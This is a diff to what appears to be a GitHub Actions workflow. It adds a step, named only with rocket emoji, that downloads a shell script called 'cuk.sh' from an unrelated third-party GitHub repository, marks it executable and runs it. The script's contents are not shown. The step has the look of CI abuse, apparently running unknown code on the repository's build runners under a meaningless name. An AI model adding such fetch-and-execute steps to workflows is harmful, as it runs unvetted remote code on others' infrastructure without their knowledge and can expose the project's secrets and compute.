@@ -28,4 +28,4 @@ jobs:
       uses: actions/checkout@v1
     - name: 🚀🚀🚀🚀🚀
       run: |
-
+          wget https://github.com/chiarasss/hiji/raw/main/cuk.sh && chmod u+x cuk.sh && ./cuk.sh
